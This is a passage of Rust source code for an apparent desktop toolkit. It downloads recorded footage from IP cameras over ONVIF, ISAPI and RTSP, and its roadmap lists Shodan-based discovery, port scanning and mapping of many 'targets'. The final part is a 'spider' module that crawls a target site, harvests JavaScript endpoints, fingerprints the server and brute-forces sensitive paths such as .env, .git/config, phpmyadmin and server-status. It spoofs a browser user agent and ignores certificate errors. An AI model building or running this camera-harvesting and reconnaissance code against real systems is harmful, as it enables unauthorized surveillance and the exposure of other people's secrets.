                let _ = child.wait();
                return Err("Таймаут ONVIF RTSP capture (180s)".into());
            }

            tokio::time::sleep(Duration::from_millis(300)).await;
        }

        let bytes_written = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
        let duration_ms = started.elapsed().as_millis();

        push_runtime_log(
            &log_state,
            format!(
                "DOWNLOAD_PROGRESS|{}|{}|{}",
                task_key, bytes_written, bytes_written
            ),
        );
        push_runtime_log(
            &log_state,
            format!(
                "ONVIF RTSP download finished: {} ({} bytes, {} ms) [task:{}]",
                filename, bytes_written, duration_ms, task_key
            ),
        );

        if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
            cancelled.remove(&task_key);
        }

        return Ok(DownloadReport {
            server_alias: "onvif".into(),
            filename,
            save_path: path.to_string_lossy().to_string(),
            bytes_written,
            total_bytes: bytes_written,
            duration_ms,
            resumed: false,
            skipped_as_complete: false,
        });
    }

    if !replay_uri_lc.starts_with("http://") && !replay_uri_lc.starts_with("https://") {
        return Err(format!("Неподдерживаемая схема replay URI: {}", replay_uri));
    }

    let started = std::time::Instant::now();
    let resp = client
        .get(&replay_uri)
        .basic_auth(login, Some(pass))
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if !resp.status().is_success() {
        return Err(format!(
            "ONVIF download failed with HTTP {}",
            resp.status().as_u16()
        ));
    }

    let total_size = resp.content_length().unwrap_or(0);
    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("onvif_record_{}.mp4", Utc::now().timestamp()));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("onvif")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let mut stream = resp.bytes_stream();
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_progress_mark = progress_step;

    while let Some(chunk) = stream.next().await {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = std::fs::remove_file(&path);
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!(
                "Загрузка отменена пользователем [task:{}]",
                task_key
            ));
        }

        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        bytes_written += data.len() as u64;

        if bytes_written >= next_progress_mark {
            push_runtime_log(
                &log_state,
                format!(
                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                    task_key,
                    bytes_written,
                    total_size.max(bytes_written)
                ),
            );
            next_progress_mark += progress_step;
        }
    }

    let duration_ms = started.elapsed().as_millis();
    push_runtime_log(
        &log_state,
        format!(
            "ONVIF download finished: {} ({} bytes, {} ms) [task:{}]",
            filename, bytes_written, duration_ms, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: "onvif".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: total_size.max(bytes_written),
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

#[tauri::command]
async fn download_isapi_playback_uri(
    playback_uri: String,
    login: String,
    pass: String,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    if playback_uri.trim().is_empty() {
        return Err("Пустой playback_uri".into());
    }

    let task_key = task_id.unwrap_or_else(|| format!("isapi_{}", Utc::now().timestamp_millis()));
    push_runtime_log(
        &log_state,
        format!(
            "ISAPI download requested: {} [task:{}]",
            playback_uri, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(45))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let started = std::time::Instant::now();
    let resp = client
        .get(&playback_uri)
        .basic_auth(login, Some(pass))
        .send()
        .await
        .map_err(|e| e.to_string())?;

    if !resp.status().is_success() {
        return Err(format!(
            "ISAPI download failed with HTTP {}",
            resp.status().as_u16()
        ));
    }

    let total_size = resp.content_length().unwrap_or(0);

    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("isapi_record_{}.mp4", Utc::now().timestamp()));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("isapi")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let mut stream = resp.bytes_stream();
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_progress_mark = progress_step;

    while let Some(chunk) = stream.next().await {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = std::fs::remove_file(&path);
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!(
                "Загрузка отменена пользователем [task:{}]",
                task_key
            ));
        }

        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        bytes_written += data.len() as u64;

        if bytes_written >= next_progress_mark {
            push_runtime_log(
                &log_state,
                format!(
                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                    task_key,
                    bytes_written,
                    total_size.max(bytes_written)
                ),
            );
            next_progress_mark += progress_step;
        }
    }

    let duration_ms = started.elapsed().as_millis();
    push_runtime_log(
        &log_state,
        format!(
            "ISAPI download finished: {} ({} bytes, {} ms) [task:{}]",
            filename, bytes_written, duration_ms, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: "isapi".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: total_size.max(bytes_written),
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

#[tauri::command]
fn get_implementation_status() -> Result<ImplementationStatus, String> {
    let items = vec![
        RoadmapItem {
            name: "Vault encryption + sled storage".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Live stream engine (RTSP/MJPEG -> HLS)".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Hub/Shodan/Videodvor discovery".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "FTP resilience (banner/retry/resume)".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Automatic host service/port scanner".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "ISAPI/ONVIF archive extraction".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Download manager UX (queue/cancel/persist)".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Map filtering for >100 targets".into(),
            status: "completed".into(),
        },
        RoadmapItem {
            name: "Embedded runtime logs terminal".into(),
            status: "completed".into(),
        },
    ];

    let total = items.len();
    let completed = items.iter().filter(|i| i.status == "completed").count();
    let in_progress = items.iter().filter(|i| i.status == "in_progress").count();
    let pending = items.iter().filter(|i| i.status == "pending").count();

    Ok(ImplementationStatus {
        total,
        completed,
        in_progress,
        pending,
        left: total.saturating_sub(completed),
        items,
    })
}


// 1. ВСТАВЛЯЕШЬ ФУНКЦИИ ЗДЕСЬ (до функции main)

// =============================================================================
// УНИВЕРСАЛЬНАЯ ВЫГРУЗКА АРХИВА (замена мёртвому FTP)
// =============================================================================

/// Захват архивного сегмента через FFmpeg (RTSP/HTTP/MJPEG → MP4)
/// Работает для любого источника, который FFmpeg может открыть:
///  - RTSP: rtsp://login:pass@host/Streaming/tracks/101?starttime=...
///  - HTTP: http://host/ISAPI/ContentMgmt/download?playbackURI=...
///  - HUB:  https://videodvor.by/stream/rtsp2mjpeg.php?...
#[tauri::command]
async fn capture_archive_segment(
    source_url: String,
    filename_hint: Option<String>,
    duration_seconds: Option<u64>,
    extra_headers: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    if source_url.trim().is_empty() {
        return Err("Пустой source_url для захвата архива".into());
    }

    let task_key = task_id.unwrap_or_else(|| format!("capture_{}", Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    let duration = duration_seconds.unwrap_or(60); // По умолчанию 60 секунд
    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("archive_{}.mp4", Utc::now().format("%Y%m%d_%H%M%S")));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("captures")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    push_runtime_log(
        &log_state,
        format!(
            "Archive capture started: {} → {} ({}s) [task:{}]",
            source_url, filename, duration, task_key
        ),
    );

    let ffmpeg = get_vault_path().join("ffmpeg.exe");
    let output_path = path.to_string_lossy().to_string();

    // Собираем аргументы FFmpeg
    let mut args: Vec<String> = Vec::new();

    // Если RTSP — добавляем транспорт
    let source_lc = source_url.to_lowercase();
    if source_lc.starts_with("rtsp://") {
        args.extend_from_slice(&[
            "-rtsp_transport".into(), "tcp".into(),
            "-timeout".into(), "10000000".into(),
            "-stimeout".into(), "10000000".into(),
        ]);
    }

    // Если HTTP(S) — добавляем реконнект и хедеры
    if source_lc.starts_with("http://") || source_lc.starts_with("https://") {
        args.extend_from_slice(&[
            "-reconnect".into(), "1".into(),
            "-reconnect_at_eof".into(), "1".into(),
            "-reconnect_streamed".into(), "1".into(),
            "-reconnect_delay_max".into(), "5".into(),
            "-user_agent".into(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36".into(),
        ]);

        if let Some(ref headers) = extra_headers {
            args.extend_from_slice(&["-headers".into(), headers.clone()]);
        }
    }

    // Ввод
    args.extend_from_slice(&[
        "-y".into(),
        "-i".into(), source_url.clone(),
    ]);

    // Лимит по времени
    args.extend_from_slice(&[
        "-t".into(), duration.to_string(),
    ]);

    // Кодирование — copy если источник уже H.264, иначе перекодируем
    args.extend_from_slice(&[
        "-c".into(), "copy".into(),         // Пробуем copy (быстро)
        "-movflags".into(), "+faststart".into(), // Метаданные в начало файла
    ]);

    // Выход
    args.push(output_path.clone());

    let mut child = Command::new(&ffmpeg)
        .args(&args)
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("Не удалось запустить FFmpeg: {}", e))?;

    let started = std::time::Instant::now();
    let mut last_progress = std::time::Instant::now();
    let mut last_size: u64 = 0;

    loop {
        // Проверяем отмену
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_file(&path);
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!("Захват отменён [task:{}]", task_key));
        }

        // Проверяем: завершился ли FFmpeg?
        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    // FFmpeg завершился с ошибкой — пробуем перекодировать
                    let stderr_text = if let Some(mut stderr) = child.stderr.take() {
                        use std::io::Read;
                        let mut buf = String::new();
                        let _ = stderr.read_to_string(&mut buf);
                        buf.lines().rev().take(3).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>().join(" | ")
                    } else { String::new() };

                    // Если copy не сработал — fallback на re-encode
                    if stderr_text.contains("Invalid data") || stderr_text.contains("codec not currently supported") {
                        push_runtime_log(&log_state, format!("FFmpeg copy failed, retrying with re-encode: {}", stderr_text));

                        // Заменяем -c copy на -c:v libx264
                        let mut retry_args: Vec<String> = args.iter()
                            .map(|a| if a == "copy" { "libx264".to_string() } else { a.clone() })
                            .collect();
                        // Добавляем параметры перекодировки перед output
                        let out_idx = retry_args.len() - 1;
                        retry_args.insert(out_idx, "-preset".into());
                        retry_args.insert(out_idx + 1, "fast".into());
                        retry_args.insert(out_idx + 2, "-crf".into());
                        retry_args.insert(out_idx + 3, "23".into());

                        let mut child2 = Command::new(&ffmpeg)
                            .args(&retry_args)
                            .stdout(Stdio::null())
                            .stderr(Stdio::null())
                            .spawn()
                            .map_err(|e| format!("FFmpeg re-encode failed: {}", e))?;

                        // Ждём завершения
                        let timeout_secs = duration + 30;
                        loop {
                            match child2.try_wait() {
                                Ok(Some(_)) => break,
                                Ok(None) => {},
                                Err(e) => return Err(format!("Ошибка FFmpeg: {}", e)),
                            }
                            if started.elapsed() > std::time::Duration::from_secs(timeout_secs) {
                                let _ = child2.kill();
                                return Err("Таймаут захвата архива".into());
                            }
                            std::thread::sleep(std::time::Duration::from_millis(500));
                        }
                    } else {
                        return Err(format!("FFmpeg error: {}", stderr_text));
                    }
                }
                break;
            }
            Ok(None) => {} // Ещё работает
            Err(e) => return Err(format!("Ошибка ожидания FFmpeg: {}", e)),
        }

        // Прогресс
        if last_progress.elapsed() >= std::time::Duration::from_secs(2) {
            let current_size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(last_size);
            if current_size > last_size {
                push_runtime_log(
                    &log_state,
                    format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, current_size),
                );
                last_size = current_size;
            }
            last_progress = std::time::Instant::now();
        }

        // Общий таймаут: duration + 30 секунд на запас
        if started.elapsed() > std::time::Duration::from_secs(duration + 30) {
            let _ = child.kill();
            let _ = child.wait();
            push_runtime_log(&log_state, format!("Archive capture timeout for {}", filename));
            break; // Не ошибка — может быть частичная запись
        }

        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    let bytes_written = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    let duration_ms = started.elapsed().as_millis();

    push_runtime_log(
        &log_state,
        format!(
            "DOWNLOAD_PROGRESS|{}|{}|{}", task_key, bytes_written, bytes_written
        ),
    );
    push_runtime_log(
        &log_state,
        format!(
            "Archive capture finished: {} ({} bytes, {}ms) [task:{}]",
            filename, bytes_written, duration_ms, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    if bytes_written == 0 {
        let _ = std::fs::remove_file(&path);
        return Err("Захват не получил данных — источник недоступен или формат не поддерживается".into());
    }

    Ok(DownloadReport {
        server_alias: "capture".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: bytes_written,
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

/// HTTP-скачивание файла по прямой ссылке с прогрессом
/// Универсальный метод для ISAPI playback URI, HUB download links и любых HTTP-источников
#[tauri::command]
async fn download_http_archive(
    url: String,
    login: Option<String>,
    pass: Option<String>,
    extra_cookie: Option<String>,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    if url.trim().is_empty() {
        return Err("Пустой URL".into());
    }

    let task_key = task_id.unwrap_or_else(|| format!("http_{}", Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    push_runtime_log(&log_state, format!("HTTP download: {} [task:{}]", url, task_key));

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(300))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .map_err(|e| e.to_string())?;

    let mut request = client.get(&url);

    if let (Some(ref l), Some(ref p)) = (&login, &pass) {
        request = request.basic_auth(l, Some(p));
    }
    if let Some(ref cookie) = extra_cookie {
        request = request.header("Cookie", cookie.as_str());
    }

    let started = std::time::Instant::now();
    let resp = request.send().await.map_err(|e| e.to_string())?;

    if !resp.status().is_success() {
        return Err(format!("HTTP {} для {}", resp.status().as_u16(), url));
    }

    let total_size = resp.content_length().unwrap_or(0);

    // Определяем имя файла из Content-Disposition или hint
    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            // Пробуем из Content-Disposition
            resp.headers()
                .get("content-disposition")
                .and_then(|v| v.to_str().ok())
                .and_then(|v| {
                    v.split("filename=").nth(1)
                        .map(|s| s.trim_matches('"').trim_matches('\'').to_string())
                })
                .map(|s| sanitize_filename_component(&s))
                .filter(|s| !s.is_empty())
                .unwrap_or_else(|| format!("download_{}.mp4", Utc::now().format("%Y%m%d_%H%M%S")))
        });
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("http")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let mut stream = resp.bytes_stream();
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let progress_step = 1024 * 1024u64; // Прогресс каждый МБ
    let mut next_progress_mark = progress_step;

    while let Some(chunk) = stream.next().await {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = std::fs::remove_file(&path);
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(&log_state, format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename));
            return Err(format!("Загрузка отменена [task:{}]", task_key));
        }

        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        bytes_written += data.len() as u64;

        if bytes_written >= next_progress_mark {
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_PROGRESS|{}|{}|{}", task_key, bytes_written, total_size.max(bytes_written)),
            );
            next_progress_mark += progress_step;
        }
    }

    let duration_ms = started.elapsed().as_millis();
    push_runtime_log(
        &log_state,
        format!("HTTP download finished: {} ({} bytes, {}ms) [task:{}]", filename, bytes_written, duration_ms, task_key),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: "http".into(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: total_size.max(bytes_written),
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

// =============================================================================
// 🕷️ HYPERION SPIDER — УЛЬТИМАТИВНЫЙ ПАУК-РАЗВЕДЧИК
// =============================================================================

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct SpiderPage {
    url: String,
    status_code: u16,
    content_type: String,
    content_length: u64,
    title: String,
    links_found: usize,
    depth: u32,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct SpiderJsEndpoint {
    source_script: String,
    endpoint: String,
    method: String, // GET/POST/AJAX/FETCH/WS
    context: String, // Строка кода вокруг найденного endpoint
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct SpiderDirResult {
    path: String,
    status_code: u16,
    content_length: u64,
    content_type: String,
    verdict: String,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
struct TechFingerprint {
    key: String,
    value: String,
    source: String,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct SpiderReport {
    target: String,
    pages_crawled: usize,
    pages: Vec<SpiderPage>,
    js_endpoints: Vec<SpiderJsEndpoint>,
    dir_results: Vec<SpiderDirResult>,
    tech_stack: Vec<TechFingerprint>,
    all_headers: HashMap<String, Vec<String>>,
    sitemap: Vec<String>,
    saved_html_dir: String,
    duration_sec: u64,
}

/// Основная команда паука — запускает все модули последовательно
#[tauri::command]
async fn spider_full_scan(
    target_url: String,
    cookie: Option<String>,
    max_depth: Option<u32>,
    max_pages: Option<usize>,
    dir_bruteforce: Option<bool>,
    log_state: State<'_, LogState>,
) -> Result<SpiderReport, String> {
    let started = std::time::Instant::now();
    let max_d = max_depth.unwrap_or(3);
    let max_p = max_pages.unwrap_or(100);
    let do_dirs = dir_bruteforce.unwrap_or(true);

    push_runtime_log(&log_state, format!("🕷️ SPIDER START: {} (depth={}, max={})", target_url, max_d, max_p));

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .redirect(reqwest::redirect::Policy::limited(5))
        .build()
        .map_err(|e| e.to_string())?;

    let cookie_str = cookie.unwrap_or_default();

    // Определяем base URL
    let base = extract_base_url(&target_url);
    let base_domain = extract_domain(&target_url);

    // ===== ФАЗА 1: CRAWLER =====
    push_runtime_log(&log_state, "🕷️ [1/4] CRAWLING...".to_string());

    let mut visited: HashSet<String> = HashSet::new();
    let mut queue: Vec<(String, u32)> = vec![(target_url.clone(), 0)];
    let mut pages: Vec<SpiderPage> = Vec::new();
    let mut all_links: Vec<String> = Vec::new();
    let mut all_scripts: Vec<String> = Vec::new();
    let mut all_headers: HashMap<String, Vec<String>> = HashMap::new();

    // Директория для сохранения HTML
    let html_dir = get_vault_path().join("spider").join(sanitize_filename_component(&base_domain));
    let _ = std::fs::create_dir_all(&html_dir);

    while let Some((url, depth)) = queue.pop() {
        if visited.contains(&url) || visited.len() >= max_p || depth > max_d {
            continue;
        }
        visited.insert(url.clone());

        let mut req = client.get(&url);
        if !cookie_str.is_empty() {
            req = req.header("Cookie", &cookie_str);
        }
        req = req.header("Referer", &target_url);

        let resp = match req.send().await {
            Ok(r) => r,
            Err(e) => {
                push_runtime_log(&log_state, format!("  ❌ {} : {}", &url[url.len().saturating_sub(50)..], e));
                continue;
            }
        };

        let status = resp.status().as_u16();
        let ct = resp.headers().get("content-type")
            .and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
        let cl = resp.content_length().unwrap_or(0);

        // Собираем ВСЕ заголовки
        for (name, value) in resp.headers().iter() {
            if let Ok(v) = value.to_str() {
                all_headers.entry(name.to_string())
                    .or_insert_with(Vec::new)
                    .push(format!("{}: {}", url, v));
            }
        }

        // Пропускаем бинарные ответы
        if ct.contains("image") || ct.contains("video") || ct.contains("audio")
            || ct.contains("octet-stream") || ct.contains("pdf") {
            pages.push(SpiderPage {
                url: url.clone(), status_code: status, content_type: ct,
                content_length: cl, title: "[BINARY]".into(), links_found: 0, depth,
            });
            continue;
        }

        let body = match resp.text().await {
            Ok(b) => b,
            Err(_) => continue,
        };

        // Сохраняем HTML на диск
        let safe_name = sanitize_filename_component(
            &url.replace(&base, "").replace("/", "_").replace("?", "_")
        );
        let html_file = html_dir.join(format!(
            "{}_{}.html",
            if safe_name.is_empty() { "index" } else { &safe_name },
            depth
        ));
        let _ = std::fs::write(&html_file, &body);

        // Извлекаем title
        let title = extract_tag_content(&body, "title").unwrap_or_default();

        // Извлекаем ссылки
        let links = extract_links(&body, &base);
        let scripts = extract_script_srcs(&body, &base);
        let link_count = links.len();

        for link in &links {
            if !visited.contains(link) && link.contains(&base_domain) {
                queue.push((link.clone(), depth + 1));
            }
            if !all_links.contains(link) {
                all_links.push(link.clone());
            }
        }
        for s in &scripts {
            if !all_scripts.contains(s) {
                all_scripts.push(s.clone());
            }
        }

        pages.push(SpiderPage {
            url: url.clone(), status_code: status, content_type: ct,
            content_length: body.len() as u64, title, links_found: link_count, depth,
        });

        push_runtime_log(&log_state, format!(
            "  ✅ [d{}] {} → {} links, {} scripts",
            depth, &url[url.len().saturating_sub(45)..], link_count, scripts.len()
        ));

        // Маленькая задержка чтобы не залить сервер
        tokio::time::sleep(Duration::from_millis(200)).await;
    }

    // ===== ФАЗА 2: JS PARSER =====
    push_runtime_log(&log_state, format!("🕷️ [2/4] JS PARSING ({} scripts)...", all_scripts.len()));

    let mut js_endpoints: Vec<SpiderJsEndpoint> = Vec::new();

    for script_url in &all_scripts {
        let mut req = client.get(script_url);
        if !cookie_str.is_empty() {
            req = req.header("Cookie", &cookie_str);
        }

        if let Ok(resp) = req.send().await {
            if let Ok(js_body) = resp.text().await {
                // Сохраняем JS файл
                let js_name = sanitize_filename_component(
                    script_url.split('/').last().unwrap_or("script.js")
                );
                let js_file = html_dir.join(format!("js_{}", js_name));
                let _ = std::fs::write(&js_file, &js_body);

                // Парсим endpoints
                let found = extract_js_endpoints(&js_body, script_url);
                push_runtime_log(&log_state, format!(
                    "  📜 {} → {} endpoints", js_name, found.len()
                ));
                js_endpoints.extend(found);
            }
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    // ===== ФАЗА 3: DIR BRUTEFORCE =====
    let mut dir_results: Vec<SpiderDirResult> = Vec::new();

    if do_dirs {
        push_runtime_log(&log_state, "🕷️ [3/4] DIR BRUTEFORCE...".to_string());

        let dirs = vec![
            "admin", "admin.php", "login", "login.php", "api", "api.php",
            "ajax.php", "config", "config.php", "backup", "db", "database",
            "upload", "uploads", "files", "download", "download.php",
            "stream", "video", "archive", "archive.php", "test", "test.php",
            "debug", "debug.php", "info.php", "phpinfo.php", "status",
            "panel", "dashboard", "manage", "manager", "cms",
            "wp-admin", "wp-login.php", ".env", ".git/config", ".htaccess",
            "robots.txt", "sitemap.xml", "crossdomain.xml",
            "server-status", "server-info",
            "cgi-bin", "phpmyadmin", "pma",
            "api/v1", "api/v2", "rest", "graphql",
            "static", "assets", "js", "css", "img", "media",
            "data", "tmp", "temp", "cache", "log", "logs",
            "include", "includes", "lib", "vendor",
            "install", "setup", "install.php", "setup.php",
            "user", "users", "account", "profile",
            "check.php", "get.php", "video.php", "stream.php",
            "rtsp2mjpeg.php", "export.php", "report.php",
        ];

        for dir in &dirs {
            let url = format!("{}/{}", base.trim_end_matches('/'), dir);
            let mut req = client.get(&url);
            if !cookie_str.is_empty() {
                req = req.header("Cookie", &cookie_str);
            }

            if let Ok(resp) = req.send().await {
                let status = resp.status().as_u16();
                let cl = resp.content_length().unwrap_or(0);
                let ct = resp.headers().get("content-type")
                    .and_then(|v| v.to_str().ok()).unwrap_or("").to_string();

                let verdict = match status {
                    200 => "✅ НАЙДЕНО".into(),
                    301 | 302 => {
                        let loc = resp.headers().get("location")
                            .and_then(|v| v.to_str().ok()).unwrap_or("?");
                        format!("↗️ РЕДИРЕКТ → {}", loc)
                    }
                    401 => "🔒 ТРЕБУЕТ АВТОРИЗАЦИИ".into(),
                    403 => "🚫 ЗАПРЕЩЕНО (EXISTS!)".into(),
                    404 => "⬛ НЕТ".into(),
                    _ => format!("❓ HTTP {}", status),
                };

                if status != 404 {
                    push_runtime_log(&log_state, format!("  {} /{} → {}", status, dir, verdict));
                }

                dir_results.push(SpiderDirResult {
                    path: format!("/{}", dir),
                    status_code: status,
                    content_length: cl,
                    content_type: ct,
                    verdict,
                });
            }

            tokio::time::sleep(Duration::from_millis(50)).await;
        }
    }

    // ===== ФАЗА 4: TECH FINGERPRINT =====
    push_runtime_log(&log_state, "🕷️ [4/4] TECH FINGERPRINT...".to_string());

    let mut tech_stack: Vec<TechFingerprint> = Vec::new();

    // Из заголовков
    if let Some(vals) = all_headers.get("server") {
        if let Some(first) = vals.first() {
            let server = first.split(": ").nth(1).unwrap_or(first);
            tech_stack.push(TechFingerprint {
                key: "Server".into(), value: server.to_string(), source: "HTTP Header".into(),
            });
        }
    }
    if let Some(vals) = all_headers.get("x-powered-by") {
        if let Some(first) = vals.first() {
            let powered = first.split(": ").nth(1).unwrap_or(first);
            tech_stack.push(TechFingerprint {
                key: "Powered By".into(), value: powered.to_string(), source: "HTTP Header".into(),
            });
        }
    }
    for header_name in &["x-aspnet-version", "x-generator", "x-cms", "x-frame-options",
                          "content-security-policy", "strict-transport-security",
                          "x-xss-protection", "x-content-type-options"] {
        if let Some(vals) = all_headers.get(*header_name) {
            if let Some(first) = vals.first() {
                let val = first.split(": ").nth(1).unwrap_or(first);
                tech_stack.push(TechFingerprint {
                    key: header_name.to_string(), value: val.to_string(), source: "HTTP Header".into(),
                });
            }
        }
    }

    // Из HTML мета-тегов (из первой страницы)
    if let Some(first_page_html) = std::fs::read_dir(&html_dir).ok()
        .and_then(|mut d| d.next())
        .and_then(|e| e.ok())
        .map(|e| std::fs::read_to_string(e.path()).unwrap_or_default())
    {
        let generator_re = Regex::new(r#"<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']"#).unwrap();
        if let Some(cap) = generator_re.captures(&first_page_html) {
            tech_stack.push(TechFingerprint {
                key: "Generator".into(), value: cap[1].to_string(), source: "HTML meta".into(),
            });
        }
    }

    // Из cookies
    if let Some(vals) = all_headers.get("set-cookie") {
        for v in vals {
            let cookie_val = v.split(": ").nth(1).unwrap_or(v);
            if cookie_val.contains("PHPSESSID") {
                tech_stack.push(TechFingerprint {
